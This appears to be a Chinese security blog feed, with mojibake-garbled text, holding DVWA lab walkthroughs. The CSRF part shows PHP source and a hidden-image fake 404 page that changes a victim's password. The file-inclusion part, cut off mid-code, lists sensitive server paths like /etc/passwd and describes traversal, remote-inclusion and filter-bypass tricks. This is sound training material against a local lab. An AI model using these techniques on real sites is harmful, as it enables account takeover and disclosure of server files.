    <content type="html"><![CDATA[<p>å‰è¨€ï¼š</p><p>CSRFï¼Œå…¨ç§°Cross-site request forgeryï¼Œè¯‘ä¸ºè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯æŒ‡åˆ©ç”¨å—å®³è€…å°šæœªå¤±æ•ˆçš„èº«ä»½è®¤è¯ä¿¡æ¯ï¼ˆcookieã€ä¼šè¯ç­‰ï¼‰ï¼Œè¯±éª—å…¶ç‚¹å‡»æ¶æ„é“¾æ¥æˆ–è€…è®¿é—®åŒ…å«æ”»å‡»ä»£ç çš„é¡µé¢ï¼Œåœ¨å—å®³äººä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥å—å®³è€…çš„èº«ä»½å‘ï¼ˆèº«ä»½è®¤è¯ä¿¡æ¯æ‰€å¯¹åº”çš„ï¼‰æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»è€Œå®Œæˆéæ³•æ“ä½œï¼ˆå¦‚è½¬è´¦ã€æ”¹å¯†ç­‰ï¼‰ã€‚CSRFä¸XSSæœ€å¤§çš„åŒºåˆ«å°±åœ¨äºï¼ŒCSRFå¹¶æ²¡æœ‰ç›—å–cookieè€Œæ˜¯ç›´æ¥åˆ©ç”¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå—å®³è€…éœ€è¦ä½¿ç”¨å«æœ‰æ•ˆcookieçš„æµè§ˆå™¨è®¿é—®æ”»å‡»è€…çš„é¡µé¢æ—¶æ‰ä¼šè§¦å‘csrfæ”»å‡»ã€‚</p><p><img src="/DVWA%E2%80%94CSRF/1.png" alt="1"></p><h1 id="Low"><a href="#Low" class="headerlink" title="Low:"></a>Low:</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨æ²¡æœ‰ä»»ä½•çš„é˜²CSRFæœºåˆ¶ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ 404ç½‘é¡µè¿›è¡Œè®¿é—®æ¬ºéª—ï¼Œç¼–å†™test.htmlï¼Œå†…å®¹ä¸ºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:81/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å½“å—å®³è€…ç‚¹å‡»test.htmlæ—¶ï¼Œå°±ç›¸å½“äºæ”»å‡»è€…åˆ©ç”¨å—å®³è€…çš„cookieï¼ˆå³åˆ©ç”¨å—å®³è€…çš„èº«ä»½ï¼‰è¿›è¡Œäº†ä¿®æ”¹å—å®³è€…è´¦æˆ·å¯†ç è¿™æ ·ä¸€ä¸ªæ“ä½œã€‚æœåŠ¡å™¨é‚£è¾¹ä¼šè¯¯ä»¥ä¸ºæ˜¯å—å®³è€…è‡ªå·±ä¸‹è¾¾çš„æ”¹å¯†ç çš„æŒ‡ä»¤ï¼Œè€Œå—å®³è€…ä¼šä»¥ä¸ºè‡ªå·±ç‚¹åˆ°äº†ä¸€ä¸ªå¤±æ•ˆçš„urlï¼Œé¡µé¢è¿”å›404,ï¼Œä½†æ˜¯å…¶å®è¿™æ—¶å—å®³è€…çš„å¯†ç å·²ç»è¢«æ‚„æ‚„æ›´æ”¹ã€‚å¯æƒ³è€ŒçŸ¥CSRFçš„å±å®³æ€§å¤šä¹ˆå¤§ã€‚</p><h1 id="Mediumï¼š"><a href="#Mediumï¼š" class="headerlink" title="Mediumï¼š"></a>Mediumï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,$_SERVER[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨æ£€æŸ¥å˜é‡ HTTP_REFERERï¼ˆhttpåŒ…å¤´çš„Refererå‚æ•°çš„å€¼ï¼Œè¡¨ç¤ºæ¥æºåœ°å€ï¼‰ä¸­æ˜¯å¦åŒ…å«SERVER_NAMEï¼ˆhttpåŒ…å¤´çš„Hostå‚æ•°çš„å€¼ï¼‰ï¼Œä»¥æŠµå¾¡CSRFæ”»å‡»ã€‚</p><p>æˆ‘ä»¬å…ˆåœ¨åŸé¡µé¢ä¸Šæäº¤ä¿®æ”¹å¯†ç è¯·æ±‚ï¼ŒburpæŠ“åŒ…ï¼š<img src="/DVWA%E2%80%94CSRF/2.png" alt="2"></p><p>å†æ¨¡æ‹ŸCSRFæ”»å‡»ï¼ŒburpæŠ“åŒ…ï¼š<img src="/DVWA%E2%80%94CSRF/3.png" alt="3"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœæŒ‰ç…§lowçº§åˆ«çš„CSRFæ”»å‡»æ˜¯è‚¯å®šä¸å¯èƒ½æ”»å‡»æˆåŠŸçš„ï¼Œå› ä¸ºå®ƒç¼ºå°‘äº†Refererçš„å€¼ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æ·»åŠ </p><p>Referer: localhost:81</p><h1 id="High"><a href="#High" class="headerlink" title="High:"></a>High:</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‰è¨€ï¼š&lt;/p&gt;
&lt;p&gt;CSRFï¼Œå…¨ç§°Cross-site request forgeryï¼Œè¯‘ä¸ºè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯æŒ‡åˆ©ç”¨å—å®³è€…å°šæœªå¤±æ•ˆçš„èº«ä»½è®¤è¯ä¿¡æ¯ï¼ˆcookieã€ä¼šè¯ç­‰ï¼‰ï¼Œè¯±éª—å…¶ç‚¹å‡»æ¶æ„é“¾æ¥æˆ–è€…è®¿é—®åŒ…å«æ”»å‡»ä»£ç çš„é¡µé¢ï¼Œåœ¨å—å®³äººä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥å—å®³è€…çš„èº«ä»½å‘ï¼ˆèº«ä»½è®¤è¯ä¿¡æ¯æ‰€å¯¹åº”</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWAâ€”File Inclusion</title>
    <link href="http://example.com/2021/02/28/DVWA%E2%80%94File%20Inclusion/"/>
    <id>http://example.com/2021/02/28/DVWA%E2%80%94File%20Inclusion/</id>
    <published>2021-02-28T11:26:47.000Z</published>
    <updated>2021-03-12T11:37:17.510Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h1><p>File Inclusionï¼Œè¯‘ä¸ºæ–‡ä»¶åŒ…å«ï¼ˆæ¼æ´ï¼‰ã€‚æœåŠ¡å™¨å¼€å¯allow_url_includeé€‰é¡¹æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡phpçš„æŸäº›ç‰¹æ€§å‡½æ•°ï¼ˆ<code>include()</code>ï¼Œ<code>require()</code>å’Œ<code>include_once()</code>ï¼Œ<code>require_once()</code>ï¼‰åˆ©ç”¨urlå»åŠ¨æ€åŒ…å«æ–‡ä»¶ã€‚æ­¤æ—¶å¦‚æœæ²¡æœ‰å¯¹æ–‡ä»¶æ¥æºè¿›è¡Œä¸¥æ ¼å®¡æŸ¥ï¼Œå°±ä¼šå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–æˆ–è€…ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p><ul><li>æ–‡ä»¶åŒ…å«æ¼æ´åˆ†ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¸è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</li></ul><p><strong>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</strong>é€šè¿‡æµè§ˆå™¨åŒ…å«webæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œè¿™ç§æ¼æ´æ˜¯å› ä¸ºæœåŠ¡å™¨åŒ…å«æ–‡ä»¶æ—¶æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œç›´æ¥å…è®¸å¹¶æ‰§è¡Œç”¨æˆ·åœ¨urlè¾“å…¥çš„æœåŠ¡å™¨åŒ…å«æ–‡ä»¶ã€‚é€šä¿—çš„è¯´å°±æ˜¯è¢«åŒ…å«çš„æ–‡ä»¶åœ¨æœåŠ¡å™¨æœ¬åœ°ã€‚</p><p><strong>è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</strong>æœåŠ¡å™¨å¼€å¯äº†phpé…ç½®ä¸­çš„allow_url_fopené€‰é¡¹ï¼ˆé€‰é¡¹å¼€å¯ä¹‹åï¼ŒæœåŠ¡å™¨å…è®¸åŒ…å«ä¸€ä¸ªè¿œç¨‹çš„æ–‡ä»¶ï¼‰ã€‚åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šé¢„å…ˆè®¾ç½®å¥½çš„webshellï¼Œç„¶åæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´åŒ…å«ä¸€ä¸ªè¿œç¨‹çš„æ–‡ä»¶ã€‚è¿™ç§æ¼æ´çš„å‡ºç°æ˜¯å› ä¸ºæœåŠ¡å™¨å¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰è¿›è¡Œæ£€æŸ¥ï¼Œä¼šå¯¼è‡´ä¸åŒç¨‹åº¦çš„ä¿¡æ¯æ³„éœ²ã€‚é€šä¿—çš„è¯´å°±æ˜¯è¢«åŒ…å«çš„æ–‡ä»¶ä¸åœ¨ç›®æ ‡æœåŠ¡å™¨ã€‚</p><ul><li><p>å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„</p><p>åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥è·å–ç³»ç»Ÿï¼ˆæœåŠ¡å™¨ï¼‰çš„æœ¬åœ°æ–‡ä»¶çš„å†…å®¹ã€‚<br><strong>Windowsç³»ç»Ÿå¸¸è§æ•æ„Ÿæ–‡ä»¶å¦‚ä¸‹ï¼š</strong></p><p>c:\boot.ini                               ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯<br>c:\xxx\php.ini                         PHPé…ç½®ä¿¡æ¯ã€‚<br>c:\xxx\my.ini                           MySQLé…ç½®ä¿¡æ¯ã€‚<br>c: \xxx\httpd.conf                  Apacheé…ç½®ä¿¡æ¯ã€‚<br><strong>linuxç³»ç»Ÿå¸¸è§æ•æ„Ÿæ–‡ä»¶å¦‚ä¸‹ï¼š</strong></p><p>/etc/passwd                                    Linuxç³»ç»Ÿè´¦å·ä¿¡æ¯ã€‚<br>/etc/httpd/conf/httpd.conf          Apacheé…ç½®ä¿¡æ¯ã€‚<br>/etc/my.conf                                  MySQLé…ç½®ä¿¡æ¯ã€‚<br>/usr/etc/php.ini                             PHPé…ç½®ä¿¡æ¯ã€‚</p></li><li><p>å¸¸è§è·¯å¾„ç¬¦å·</p><p>/                                 æ ¹ç›®å½•<br>./                                å½“å‰ç›®å½•<br>../                               è¿”å›åˆ°ä¸Šä¸€çº§ç›®å½•<br>../../                            è¿”å›ä¸Šä¸¤çº§ç›®å½•<br>.\ ã€..\å’Œ./ã€../          æ„ä¹‰ç›¸åŒ</p></li></ul><h1 id="Lowï¼š"><a href="#Lowï¼š" class="headerlink" title="Lowï¼š"></a>Lowï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨ç«¯å¯¹pageå‚æ•°æ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤è·Ÿæ£€æŸ¥ã€‚</p><ul><li><strong>åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´</strong></li></ul><p>æˆ‘ä»¬å…ˆè®©å‚æ•°pageçš„å€¼ç­‰äºä¸€ä¸ªæœåŠ¡å™¨æœ¬åœ°ä¸å­˜åœ¨çš„æ–‡ä»¶![1](DVWAâ€”File Inclusion/1.png)</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ä¸º<code>\DVWA-master\</code>ï¼Œè€Œ<code>index.php</code>æ–‡ä»¶è·æ ¹ç›®å½•å·®ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸¤ä¸ª<code>../</code>å›åˆ°æ ¹ç›®å½•ï¼Œç„¶åå»è®¿é—®ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼šå¦‚PHPç‰ˆæœ¬ä¿¡æ¯ç­‰ã€‚![2](DVWAâ€”File Inclusion/2.png)</p><ul><li><strong>åˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´</strong></li></ul><p>å› ä¸ºæˆ‘ä»¬æ­çš„æ˜¯é¶åœºæ¨¡æ‹ŸæœåŠ¡å™¨ï¼Œé‚£dvwaï¼ˆ81ç«¯å£ï¼‰é¶åœºå°±ç›¸å½“äºä¸€ä¸ªæœåŠ¡å™¨ï¼Œæˆ‘ä»¬å†åœ¨â€œè¿œç«¯æœåŠ¡å™¨â€127.0.0.1ä¸‹ä¸Šä¼ æ–‡ä»¶1.txtå†…å®¹ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">      phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«è®¿é—®![3](DVWAâ€”File Inclusion/3.png)</p><h1 id="Mediumï¼š"><a href="#Mediumï¼š" class="headerlink" title="Mediumï¼š"></a>Mediumï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨è¿‡æ»¤äº†<code>http://</code>, <code>https://</code>ï¼Œ<code>../</code>, <code>..\</code>ï¼Œä½†æ˜¯æˆ‘ä»¬åªè¦ç”¨åŒå†™å°±å¯ä»¥ç»•è¿‡äº†</p><p>![4](DVWAâ€”File Inclusion/4.png)</p><p>![5](DVWAâ€”File Inclusion/5.png)</p><h1 id="Highï¼š"><a href="#Highï¼š" class="headerlink" title="Highï¼š"></a>Highï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span 